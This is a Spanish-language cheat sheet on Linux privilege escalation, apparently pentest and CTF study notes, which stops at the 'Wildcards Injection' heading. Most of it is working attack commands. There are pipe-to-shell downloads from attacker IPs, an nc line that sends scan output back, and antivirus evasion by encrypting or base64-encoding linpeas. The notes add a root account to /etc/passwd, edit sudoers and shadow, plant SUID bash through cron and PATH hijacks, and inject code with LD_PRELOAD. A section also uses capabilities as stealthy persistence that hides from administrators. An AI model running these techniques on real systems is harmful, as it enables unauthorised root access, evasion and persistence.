---
title: Linux Privilege Escalation
published: true
---

# Tecnicas de escalacion de privilegios en linux
## Table of contents

- [Tecnicas de escalacion de privilegios en linux](#tecnicas-de-escalacion-de-privilegios-en-linux)
  - [Herramientas automatizadas](#herramientas-automatizadas)
    - [LinPEAS](#linpeas)
    - [Linux smart enumeration](#linux-smart-enumeration)
    - [LinEnum](#linenum)
    - [Otros](#otros)
  - [Enumeración](#enumeracin)
    - [Enumeracion de usuario, red y sistema](#enumeracion-de-usuario-red-y-sistema)
    - [Busqueda en el sistema](#busqueda-en-el-sistema)
  - [ENUMERAR PUERTOS INTERNOS, SERVICIOS, PROCESOS](#enumerar-puertos-internos-servicios-procesos)
  - [ABUSO DE PERMISO EN FICHEROS SENSIBLES](#abuso-de-permiso-en-ficheros-sensibles)
    - [abuso de permisos de escritura en /etc/passwd](#abuso-de-permisos-de-escritura-en-etcpasswd)
    - [abuso de permisos de escritura en /etc/sudoers](#abuso-de-permisos-de-escritura-en-etcsudoers)
    - [abuso de permisos de escritura en /etc/shadow](#abuso-de-permisos-de-escritura-en-etcshadow)
    - [Abuso de permisos de lectura del /etc/shadow](#abuso-de-permisos-de-lectura-del-etcshadow)
    - [ABUSO DE PERMISOS DE ARCHIVO](#abuso-de-permisos-de-archivo)
  - [CONTRASEÑAS ALMACENAS](#contraseas-almacenas)
  - [Tareas cron](#tareas-cron)
    - [SECUESTRO DE LA BASH](#secuestro-de-la-bash)
  - [Permisos SUID](#permisos-suid)
    - [Variable de entorno](#variable-de-entorno)
    - [SUID SCREEN 4.5.0 (Local Privilege Escalation)](#suid-screen-450-local-privilege-escalation)
    - [DOAS BINARIO](#doas-binario)
  - [SUDO](#sudo)
    - [variable de entorno **LD_PRELOAD**](#variable-de-entorno-ld_preload)
    - [Shared Object Injection](#shared-object-injection)
  - [Capabilities](#capabilities)
    - [AGREGAR, ELIMINAR Y OBTENER CAPABILITIES](#agregar-eliminar-y-obtener-capabilities)
    - [UNA VEZ IDENTIFICADO LA CAPABILITIE](#una-vez-identificado-la-capabilitie)
  - [PATH HIJACKING](#path-hijacking)
    - [EN QUE CONSISTE?](#en-que-consiste)
    - [ENTONCES COMO ESCALAR](#entonces-como-escalar)
    - [LIMITACIONES](#limitaciones)
  - [Python Library Hijacking](#python-library-hijacking)
  - [Wildcards Injection](#wildcards-injection)
    - [secuestro del propietario a traves de chown y chmod](#secuestro-del-propietario-a-traves-de-chown-y-chmod)
    - [secuestro del propietario a traves de tar](#secuestro-del-propietario-a-traves-de-tar)
  - [SERVICE SUDO MISCONFIGURATION](#service-sudo-misconfiguration)
  - [Explotacion de kernel](#explotacion-de-kernel)
    - [CVE-2016-5195 (DirtyCow)](#cve-2016-5195-dirtycow)
    - [CVE-2010-3904 (RDS)](#cve-2010-3904-rds)
    - [CVE-2010-4258 (Full Nelson)](#cve-2010-4258-full-nelson)
    - [CVE-2012-0056 (Mempodipper)](#cve-2012-0056-mempodipper)
  - [# CVE-2021-3156: Heap-Based Buffer Overflow in Sudo (Baron Samedit)](#-cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit)
  - [CVE-2021-4034 (Pwnkit)](#cve-2021-4034-pwnkit)
  - [NFS Root squashing](#nfs-root-squashing)
  - [Docker](#docker)
    - [Montura (mount)](#montura-mount)
    - [LXC / LXD](#lxc--lxd)
    - [PRACTICA](#practica)
  - [SSH](#ssh)
    - [LECTURA DE ID_RSA](#lectura-de-id_rsa)
    - [MODIFICACION DEL AUTHORIZED_KEYS](#modificacion-del-authorized_keys)
  - [SUDO VULNERABILITY (CVE-2019-14287)](#sudo-vulnerability-cve-2019-14287)
      - [POC](#poc)
    - [mitigacion](#mitigacion)
    - [EJEMPLO](#ejemplo)
    - [PRACTICA](#practica)
  - [DIRTY PIPE ( CVE-2022-0847)](#dirty-pipe--cve-2022-0847)
  - [TECNICAS](#tecnicas)
  - [ESCALADAS DE PRIVILEGIOS INTERESANTES](#escaladas-de-privilegios-interesantes)


**NOTA RECUERDA PRIMERO SPWANEAR UNA SHELL COMPLETAMENTE INTERACTIVA**

## Herramientas automatizadas

### LinPEAS

[LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

```bash
wget "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh" -O linpeas.sh

curl "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh" -o linpeas.sh

./linpeas.sh -a #all checks (Toma mas tiempo)

./linpeas.sh -s #superfast (evita algunas comprobaciones que tioman mucho tiempo)

./linpeas.sh -P <Password> # indica una posible contraseña que puede utilizar con sudo -l y probar mas cosas
```

trasnferencia:

```bash
#Local network
sudo python -m SimpleHTTPServer 80 #Host
curl 10.10.10.10/linpeas.sh | sh #Victim

#Without curl
sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
cat < /dev/tcp/10.10.10.10/80 | sh #Victim

#Excute from memory and send output back to the host
nc -lvnp 9002 | tee linpeas.out #Host
curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim
```

Ejecucion desde github:

```bash
#From github
curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh

```

bypass antivirus:

```bash
#open-ssl encryption
openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:AVBypassWithAES -in linpeas.sh -out lp.enc
sudo python -m SimpleHTTPServer 80 #Start HTTP server
curl 10.10.10.10/lp.enc | openssl enc -aes-256-cbc -pbkdf2 -d -pass pass:AVBypassWithAES | sh #Download from the victim

#Base64 encoded
base64 -w0 linpeas.sh > lp.enc
sudo python -m SimpleHTTPServer 80 #Start HTTP server
curl 10.10.10.10/lp.enc | base64 -d | sh #Download from the victim

```

### Linux smart enumeration

[Linux smart enumeration](https://github.com/diego-treitos/linux-smart-enumeration)

```bash
wget "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -O lse.sh

curl "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -o lse.sh

./lse.sh -l0 # muestra informacion muy importante (opcion por defecto)

./lse.sh -l1 # muestra informacion interesante para escalar privilegios

./lse.sh -l2 # dumpea informacion importante del sistema
```

ejecucion directa sin desacrga:

```bash
bash <(wget -q -O - https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh) -l2 -i

bash <(curl -s https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh) -l1 -i
```


### LinEnum

[LinEnum](https://github.com/rebootuser/LinEnum)

```bash
./LinEnum.sh -s -k keyword -r report -e /tmp/ -t
```

OPCIONES:

*   -k Introduzca la palabra clave
*   -e Ingrese la ubicación de exportación
*   -t Incluir pruebas exhaustivas (largas)
*   -s Proporciona la contraseña de usuario actual para verificar los permisos de sudo (INSECURE)
*   -r Ingrese el nombre del informe
*   -h Muestra este texto de ayuda

Ejecutando sin opciones = escaneos limitados / sin archivo de salida

*   -e Requiere que el usuario ingrese una ubicación de salida, es decir, / tmp / export. Si esta ubicación no existe, se creará.
*   -r Requiere que el usuario ingrese un nombre de informe. El informe (archivo .txt) se guardará en el directorio de trabajo actual.
*   -t Realiza pruebas exhaustivas (lentas). Sin este conmutador, se realizan exploraciones "rápidas" predeterminadas.
*   -s Use el usuario actual con la contraseña proporcionada para verificar los permisos de sudo; tenga en cuenta que esto es inseguro y solo para uso de CTF.
*   -k Un conmutador opcional para el que el usuario puede buscar una sola palabra clave dentro de muchos archivos (documentado a continuación).

### Otros

* [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker)
* [BeRoot](https://github.com/AlessandroZ/BeRoot)
* [SUDO KILLER](https://github.com/TH3xACE/SUDO_KILLER)

## Enumeración

### Enumeracion de usuario, red y sistema

```bash
whoami

id

```

```bash
uname -a

(cat /proc/version || uname -a ) 2>/dev/null

lsb_release -a 2>/dev/null

echo $PATH

(env || set) 2>/dev/null
```

```bash
ifconfig

ip a

iwconfig

netstat -putan

route

arpscan -l
```

```bash
ls -la /home/*
```

### Busqueda en el sistema

Busqueda de passwords:

```bash
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null

find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
```

busqueda de una cierta palabra en todos los archivos:

```bash
grep -iRl 'palabra' 2>/dev/null

grep -r password
```

Archivos modifiacdos los ultimos 10 minitos:

```bash
find / -mmin -10 2>/dev/null | grep -Ev "^/proc"

strings /dev/mem -n10 | grep -i PASS
```

Buscando SSH keys:

```bash
find / -name authorized_keys 2> /dev/null

find / -name id_rsa 2> /dev/null
```

Buscar archivos con permisos de escritura:

```bash

find \-writable 2>/dev/null

find \-writable 2>/dev/null | grep "etc"  (filtrar una ruta importante)

find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null

find / -perm -2 -type f 2>/dev/null

find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null

#World writable files directories
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
find / -perm -o w -type d 2>/dev/null

# World executable folder
find / -perm -o x -type d 2>/dev/null

# World writable and executable folders
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
```

## ENUMERAR PUERTOS INTERNOS, SERVICIOS, PROCESOS

```bash
ps

ps -faux

ps -waux #BSD os

netstat -putan

netstat -ano

netstat -an
```

## ABUSO DE PERMISO EN FICHEROS SENSIBLES

### abuso de permisos de escritura en /etc/passwd

Como podemos escribir en esearchivo podemos agregar la siguiente linea:

```bash
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

Donde GENERATED_PASSWORD_HERE se genera a traves de alguna de estas formas:

```bash
openssl passwd

openssl passwd -1 -salt hacker hacker

mkpasswd -m SHA-512 hacker

python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

Despues:

```bash
su root
```

y colocamos la clave creada.

### abuso de permisos de escritura en /etc/sudoers

```bash
echo "username ALL=(ALL:ALL) ALL">>/etc/sudoers

# use SUDO without password
echo "username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers

echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers

```

### abuso de permisos de escritura en /etc/shadow

El archivo ` /etc/shadow` contiene hashes de contraseña de usuario y, por lo general, solo el usuario root puede leerlo.

Tenga en cuenta que el archivo `/etc/shadow` en la máquina virtual se puede escribir en todo el mundo:

creamos un usuario:

```bash
useradd pepito

passwd pepito

12345
```

abrimos el /etc/shadow y en el hash del usuario root colocamos el hash del usuario pepito, con esto al hacer sudo su y colocar la clave de pepito (12345) elevaremos privilegios.

vemos informacion:

```bash
whoami

id
```

```bash
lbs_release
```

```bash
sudo -l
```

**METODO ALTERNATIVO**

Genere un nuevo hash de contraseña con una contraseña de su elección:

```bash
mkpasswd -m sha-512 newpasswordhere
```

el resultado lo reemplazamos en el hash del usuario root.

### Abuso de permisos de lectura del /etc/shadow

normalmente el archivo `/etc/shadow` no es posible leer ni escribir, ya se menciono como abusar de permisos de escritura, pero en caso de tener permisos de lectura podemos hacer lo siguiente:

como se tiene permisos de lectura en `/etc/passwd` normalmente, debemos sacar una copia de el contenido de cada uno nuestra maquina atacante:

```bash
cat /etc/passwd
cat etc/shadow
```

pasamos a Kali su contenido y usamos la herramienta `unshadow` para realizar un ataque de fuerza bruta:

```bash
unshadow <PASSWORD-FILE> <SHADOW-FILE> > unshadowed.txt
```

ahora con hascat realizamos el ataque:

```bash
hashcat -m 1800 unshadowed.txt rockyou.txt -O
```

### ABUSO DE PERMISOS DE ARCHIVO

En caso de ser el propietario de un archivo o quizas por una mala configuracion, podemos asignar permisos de escritura a un archivo potencial para la escalada de privilegios, esto puede ser interesante cuando:

- en un archivo SUID
- en un archivo de los casos anteriores
- en un archivo del `sudo -l`
- en una tarea cron

de ser asi podemos editar el archivo para intentar escalar privilegios.

**PRACTICAR**

- cyborg - THM

## CONTRASEÑAS ALMACENAS

**OPEN VPN**

En archivos **.ovpn**  puede estar una directiva `auth-user-pass` que apunte a un archivo con las credenciales en texto plano:

```bash
cat example.ovpn

#OUTPUT

...
auth-user-pass /etc/openvpn/auth.txt
...
```

al revisar ese archivo podemos ver credenciales de acceso.

**BASH HISTORY**

muchas veces en el archivo `.bash_history` se puede encontrar credenciales que se proporcionan en algunos comandos como mysql y demas.

## Tareas cron

```bash
cat /etc/crontab
```

para poder entender cada cuanto se ejecuta una tarea esta este [calculador online](https://crontab.guru/every-2-minutes)

```bash
git clone git clone https://github.com/DominicBreuker/pspy.git
cd pspy
go build -ldflags "-s -w" .
upx brute pspy
```

[pspy](https://github.com/DominicBreuker/pspy/releases/tag/v1.2.0)

```bash
./pspy32 -pf -i 1000
./pspy64 -pf -i 1000
```

ver  en cuento tiempo se van a ejecutar tareas con timers:

```bash
systemctl list-timers --all
```

* Tarea Cron: Es una tarea que se ejecuta a intervalos reglares de tiempo. A nivel de sistema cada cierto minuto por ejemplo.

Para crear una tarea Cron, se lo debe crear en la reuta **'etc/cron.d'**

Cron es un sericio por lo que pdemos iniciarlo, detenerlo, ver su estado

```bash
service cron status
service cron start
service cron stop
```

En un entorno de CTF debemos ir a una ruta con permisos de escritura para crear este archivo. Por ejemplo /dev/shm.

Vemos la ruta de la tarea cron .sh y accedemos a ella para ver sus permisos. Si otros puede editarla y el propietario es root o tiene priilegios mas altos, es posible elevar privilegios editando ese archivo.

Debemos borrar el contenido de esa tarea.

Tenemos que agregar a la tarea cron:

```bash
chmod 4755 /bin/bash
```

Agregamos permisos SUID a la bash y esto se ejecutar como root en un determinado tiempo que tiene la tarea, entonces para spawnear una bash solo le damos desde nuestro usuario con bajos privilegios:

```bash
bash -p
```

con esoo se nos abre una bash como root o es usuario propietario. Se debe colocar la opcion '-p' para que funcione la escalada de privilegios.

Si detectamos una tarea cron en php, py, ruby, perl, java, etc.
Debemos ver la forma de ejecutar el comando 'chmod 4755 /bin/bash' con la sintaxis del lenguaje.

pueden usar la herramienta pspy para hacer la deteccion de tareas cron cn el id del usuario que la ejecuta, asi puede saber si es el usuario root quien lo hace. (id=0)

[https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)

damos permisos de ejecucin y ejecutamos:

```bash
chmod +x pspy64

./pspy64 -pf -i 1000  --> monitoreo de acciones cada 1 segundo

solo ve las tareas que ejecutan un archivo alojado en: /etc /usr /tmp /home /var /opt
pero se puede modificar
```

ver tareas cron de un usuario especifico:

```bash
crontab -l -u <user>

cat /etc/crontab

cat /var/spool/cron/crontabs/<user>

cd /var/spool/cron/crontabs/ && grep . *

```

otra forma de ver tareas cron:

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

tareas cron invisibles:

Es posible crear un cronjob **poniendo un retorno de carro después de un comentario** (sin el carácter de nueva línea), y el trabajo cron funcionará. Ejemplo (tenga en cuenta el carácter de retorno del carro):

```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```

### SECUESTRO DE LA BASH

si encontramos una tarea cron que ejecuta un script en bash, el cual tenemos permisos de escritura, podemos hacer lo siguiente:

como podemos escribir podemos agregar al comienzo la siguiente instruccion:

```bash
cp/bin/bash /tmp/bash; chmod +s /tmp/bash
```

se lo podria agregar desde consola:

```bash
echo 'cp/bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/usuario/sobrescribir.sh

echo 'cp/bin/bash /tmp/bash; chmod +s /tmp/bash' >> /home/usuario/sobrescribir.sh
```

siendo `/home/usuario/sobrescribir.sh` el script que ejecuta la tarea cron.

lo que hacemos es sacar una copia de la bash a la ruta **/tmp** donde se tiene permisos de ejecucion, y le damos el permiso SUID, si esta taera la ejecuta **root** se le otorgaria a esta copia de la bash para que se ejecute como root, caso contrario como el usuario que ejecuta la tarea.

despues podemos hacer.

```bash
/tmp/bash -p
```

y tendremos la bash como root.

## Permisos SUID

En GTFOBins puedes ver varias formas de aprovechar diferentes aplicativos si tuvieran permisos SUID.

[GTFOBins](https://gtfobins.github.io/)

Si se ejecuta un archivo con este bit, el propietario cambiará el uid. Si el propietario del archivo es root, el uid se cambiará rootincluso si fue ejecutado por el usuario bob. El bit SUID está representado por un s.

encontrar permisos SUID:

```bash
find / -uid 0 -perm -4000 -type f 2>/dev/null

find / -type f -perm -04000 -ls 2>/dev/null
```

puede que scripts personalizados tengan este permiso, por lo que ahi tocaria entender el script y ver la forma de aprovecharnos de él

### Variable de entorno

puede que al listar los binario SUID encuentre uno que le llame la atencion, utilizando `strings` podria ver mas informacion de lo que hace el binario (al ser un binario compilado si hacemos un cat nos muestra caracteres raros), por ejemplo a traves de strings podemos ver comandos que ejecuta el binario.

Imaginemos que el binario ejecuta el siguiente comando:

```bash
service apache2 start
```

es un comando que no es peligroso ni nada pero al no llamarlo de la ruta absoluta, podemos hcer un path hijacking, que es crear un binario malicioso con el mismo nombre dentro de una carpta en donde tengamos permisos de escritura, modificamos la variable de entorno PATH y hacemos que cuando se llame al comando service se llame en realidad a nuestro binario creado. (A no ser que se lo llame de su ruta absoluta)

```bash
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c

gcc /tmp/service.c -o /tmp/service

export PATH=/tmp:$PATH

# ejecucion del binario

/usr/local/bin/suid-env
```

esto nos dara una shell como root.

ahora imaginemos que el binario usa la ruta absoluta y lo podemos verificar con strings:

```bash
/usr/sbin/service apache2 start
```

diras que al usar la ruta absoluta no es posible hacer nada, pues no, aun se puede. En linux nos permiten crear variables de entorno pero tambien funciones de entorno que realicen una serie de cosas cuando se las invoca, entonces podriamos hacer lo siguiente:

creamos una funcion llamada como la ruta absoluta del comando:

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
```

esta funcion nos habre una shell como root.

exportamos la funcion:

```bash
export -f /usr/sbin/service
```

y a la hora de invocar al binario, en ralidad llamara a la funcion de entorno cuando quiera ejecutar el comando y nos dara la shell como root:

```bash
/usr/local/bin/suid-env2
```

otra forma alternativa a traves de un oneliner:

```bash
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'
```

### SUID SCREEN 4.5.0 (Local Privilege Escalation)

En caso de que screen-4.5.0  sea SUID:

- [https://www.exploit-db.com/exploits/41154](https://www.exploit-db.com/exploits/41154)
- [https://tryhackme.com/room/madness](https://tryhackme.com/room/madness)

### DOAS BINARIO

En caso de que el binario **doas** tenga permisos SUID podemos intentar lo siguiente:

```bash
doas -u root id
```

en el archivo `/etc/doas.conf` se configura que puedes ejecutar como root:

```bash
permit nopass plot_admin as root cmd openssl
```

## SUDO

```bash
sudo -l
```

* NOPASSWD: La configuración de sudo puede permitir que un usuario ejecute algún comando con los privilegios de otro usuario sin conocer la contraseña.

```bash
$ sudo -l
User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
	
sudo vim -c '!sh'
```

* SETENV: Esta directiva permite al usuario establecer una variable de entorno mientras ejecuta algo.

```bash
$ sudo -l

User waldo may run the following commands on admirer:

(ALL) SETENV: /opt/scripts/admin_tasks.sh

sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```

Esto puede servir para library hijacking.

[Mas sobre SUDO y SUID](https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid)

**NMAP**

```bash
echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse

sudo find /bin -name nano -exec /bin/sh \;

sudo awk 'BEGIN {system("/bin/sh")}'

sudo vim -c '!sh'
```

###  variable de entorno **LD_PRELOAD**

Abra un editor de texto y escriba:

```bash
include <stdio.h>
nclude <sys/types.h>
include <stdlib.h>
void _init() {
 unsetenv("LD_PRELOAD");
 setgid(0);
 setuid(0);
 system("/bin/bash");
}
```

guardelo como **x.c**

ahora ingresamos estos comandos:

```bash
gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles

sudo LD_PRELOAD=/tmp/x.so apache2

```

donde **apache2** es un programa que sale del resultado de **sudo -l**:

```bash
Matching Defaults entries for TCM on this host:
    env_reset, env_keep+=LD_PRELOAD

User TCM may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
```

puede elegir cualquier otro que salga.

```bash
gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles

sudo LD_PRELOAD=/tmp/x.so awk

```

debera haber escalado privilegios, si coloca **id** ya es root.

### Shared Object Injection

Una vez que se ejecuta un programa, buscará cargar los objetos compartidos necesarios. Podemos usar un programa llamado strace para rastrear los objetos compartidos que se llaman. Si no se encuentra un objeto compartido, podemos secuestrarlo y escribir un script malicioso para generar un shell raíz cuando se carga.

imaginemos que existe un binario SUID llamado `/usr/local/bin/suid-so`:

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

con strace podemos filtrar por **open|access|no such file** para que muestre solo librerias que el binario, abre, accede o no encuentra:

```bash
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
```

puede ser que un archivo `.so` no lo encuentre, lo abra o lo utilice, por ejemplo esta es la salida si no lo encontrara:

```bash
open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
```

dice que no encuentra el archivo `/home/user/.config/libcalc.so` asi que podemos crear uno en la misma ruta con un codigo arbitrario:

```bash
mkdir /home/user/.config
cd /home/user/.config


```

creamos un `.so` malicioso:

primero creamos el `libcalc.so` malicioso:

```bash
#lo guardamos como libcalc.c

#include <stdio.h>

#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {

 system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");

}
```

lo compilamos y lo colocamos en la ruta que llama el binario SUID:

```bash
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
```

y cuando lo ejecutemos llamara a ese `.so` malicioso que creamos y que nos spawnea una shell como root al ser un SUID:

```bash
/usr/local/bin/suid-so
```

## Capabilities

Supongamos que a comprometimos una maquina y escalamos privilegios, queremos crear una forma de persistencia con esta maquina pero de forma privilegiada. Es decir salirnoss de la maquina, volvera entrar y poder volver a ser root. Como yya fue una maquina comprometida y ya escalamoslos privilegios pdemos hacerlo como lo hicimos si no es mucho lio. 

Tambien podemois debar un binario con un permiso SUID pero si el administrador revisa esto lo quitara y nos arruina el proceso. Es ahi donde entran las capabilities, son como permisos privilegiados en un programa pero que a nivel de permisos no se muestra nada diferente.

Con las capabilities una vez que volvamos a acceder ala maquina sera muy facil convertirnos en Root, no se ve nada raro en la maquina victima y seracomo dejar nuestra escalera para subir.

### AGREGAR, ELIMINAR Y OBTENER CAPABILITIES

```bash
OBTENCION (como usuario no privilegiado)

getcap -r / 2>/dev/null

-r: deforma recursiva
/: ruta en este caso la raiz

la capabilitie 'cap_setuid+ep' es la que nos interesa de lo que muestra en el los resultados, ella debe estar asignada a un binario como php, python, bash, etc. 
```

```bash
ELIMINACION (como usuario privilegiado)

setcap -r /usr/bin/pthon3.8

-r: remove
```

```bash
AGREGAR (como usuario privilegiado)

setcap cap_setuid+ep /usr/bin/pthon3.8

```

### UNA VEZ IDENTIFICADO LA CAPABILITIE

Mediante la pagina GTFObins muestra diferentes ejemplos de los binarios que podemos explotar si tienen essta capabilitie del cap_setuid+ep. Por ejemplo:

[https://gtfobins.github.io/](https://gtfobins.github.io/)

```bash
si node tiene la capabilitie:

./node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]});'

si perl tiene la capabilitie:

./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'

si php tiene la capabilitie:

CMD="/bin/sh"
./php -r "posix_setuid(0); system('$CMD');"

si python tiene la capabilitie:

./python -c 'import os; os.setuid(0); os.system("/bin/sh")'

si ruby tiene la capabilitie:

./ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'

```

Ejecutando el comando segun el binario debera abrirse una terminal como el usuario Root.

| Capabilities name  | Description |
|---|---|
| CAP_AUDIT_CONTROL  | Allow to enable/disable kernel auditing |
| CAP_AUDIT_WRITE  | Helps to write records to kernel auditing log |
| CAP_BLOCK_SUSPEND  | This feature can block system suspends   |
| CAP_CHOWN  | Allow user to make arbitrary change to files UIDs and GIDs |
| CAP_DAC_OVERRIDE  | This helps to bypass file read, write and execute permission checks |
| CAP_DAC_READ_SEARCH  | This only bypass file and directory read/execute permission checks  |
| CAP_FOWNER  | This enables to bypass permission checks on operations that normally require the filesystem UID of the process to match the UID of the file  |
| CAP_KILL  | Allow the sending of signals to processes belonging to others  |
| CAP_SETGID  | Allow changing of the GID  |
| CAP_SETUID  | Allow changing of the UID  |
| CAP_SETPCAP  | Helps to transferring and removal of current set to any PID |
| CAP_IPC_LOCK  | This helps to lock memory  |
| CAP_MAC_ADMIN  | Allow MAC configuration or state changes  |
| CAP_NET_RAW  | Use RAW and PACKET sockets |
| CAP_NET_BIND_SERVICE  | SERVICE Bind a socket to internet domain privileged ports  |

**PRACTICAR**

- [https://tryhackme.com/room/kiba](https://tryhackme.com/room/kiba)

## PATH HIJACKING

### EN QUE CONSISTE?

A partir de un archivo, preferentemente en algun lenguaje de programacion (bash, python, C, C++, java, php, ruby, perl) u otro tipo de archivo, ademas de que contenga permisos SUID, se debe determinar si ejecuta algun tipo de comando a nivel de sistema. (ls, mkdir, ifconfig, curl, cat, ps).

Normalmente un archivo de programcion ejecuta estas tareas. 

A nivel de sistema operativo tenemos una variables de entorno que son como variables globales del sistema que guarda algun tipo de informacion, las cuales por cada nuevo inicio de sesion se reestablecen a unas predeterminadas por el sistema, entonces se pueden agregar o modificar variables solo para el inicio de sesion.

(En caso de querer alterar la variable de entorno $PATH de manera permanente, puede editar el '/etc/environment' pero no es necesario para el ataque)

Cuando se ejecuta un comando por ejemplo: 'ps' tiene una ruta absoluta y otra relativa.

```bash
ps  --> ruta relativa

/usr/bin/ps  --> ruta absoluta
``` 

Cuando usas comando a traves de la ruta relativa, lo que hace es buscar en la variable de entorno $PATH el comando por las rutas declaradas en la variable $PATH.

$PATH vale esto:

```bash
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/home/christian/Android/Sdk:/home/christian/Android/Sdk/platforms:/home/christian/Android/Sdk/tools:/opt/gradle/5.0/bin:/usr/lib/jvm/java-8-openjdk/bin:/snap/bin
```

Como se ve hay varias rutas separadas por ':', la ruta relativa busca por estas rutas (de izquierda a derecha) el comando. Se puede ver la ruta '/usr/bin' en la variable $PATH por lo que el comando se ejecuta corectamente.

### ENTONCES COMO ESCALAR

1. buscar archivos con permisos SUID

```bash
find \-perm -4000 2>/dev/null 

find \-perm -4000 -type f 2>/dev/null --> para filtrar solo archivos
```

2. Determinar un archivo raro que sea en algun lenguaje.

3. Buscar si se ejecuta algun comando.

```bash
strings nombre_archivo
```

Con strings podemos imprimir todas las cadenas imprimibles de un binario compilado.

4. Una vez determinado el comando nos dirigimos a una ruta con permisos de escritura como '/tmp' y creamos un archivo con el nombre del comando encontrado.

```bash
cd /tmp
touch comando
chmod +x comando
nano comando
agregamos 'bash -p'
```

Como el archivo encontrado ejecuta el comando y es SUID, con 'bash -p' abrimos una terminal y el parametro 'p' es una flag para abrirla como root.

5. Ahora el truco es hacer creer al sistema que ese archivo el que tiene que ejecutar, como ya dijimos al ejecutar un comando primero lo busca en la variable $PATH de izquierda a derecha, entonces agregaremos al comienzo la ruta donde creamos el archivo en este caso '/tmp'.

```bash
export PATH=/tmp:$PATH
```

Este cambio solo es temporal, si se cierra sesion y nuevamente se abre, no existira este cambio
Ahora buscara primero en /tmp y ahi es donde le decimos que el comando abrira una bash (terminal)

6. Nos dirigimos a la ruta donde esta el archivo SUID y lo ejecutamos. Al ejecutar deberia abrirnos una shell como Root.

### LIMITACIONES

El archivo debe contener una sentencia similar a esta:

```bash
setuid(0)  --> en C y python

```

Esto nos da una shell totalmente root, de lo contrario no hay seguridad en obtener la shell privilegiada.

Pero en caso de que al permiso sudo se otorga a un solo comando sin especificar la ruta:

```bash
hacker10 ALL= (root) less
```

puede modificar el path y crear un binary falso llamado **less** en este caso.

```bash
export PATH=/tmp:$PATH

#Put your backdoor in /tmp and name it "less"

sudo less
```

**PRACTICAR**

- [https://tryhackme.com/room/archangel](https://tryhackme.com/room/archangel)

## Python Library Hijacking

Normalmente cuando con sudo -l puedo ejecutar un script de python.

Comprobacion orden de las librerias de python al llamar una importacion

```bash
python o python3

import sys

sys.path
```

Se debe modificar la libreria que llama el archivo en el cual tenemos permisos de ejecucion e incluir una spawn de bash para que cuando lo llame se spawnee una bash.

[Python Library Hijacking](https://www.hackingarticles.in/linux-privilege-escalation-python-library-hijacking/)

[Maquina Stratosphere HTB](https://www.youtube.com/watch?v=NOEQ2jlhGr4&list=PLlb2ZjHtNkphBtATHv-CZQ-qABlVhINx9&index=9)

## Wildcards Injection

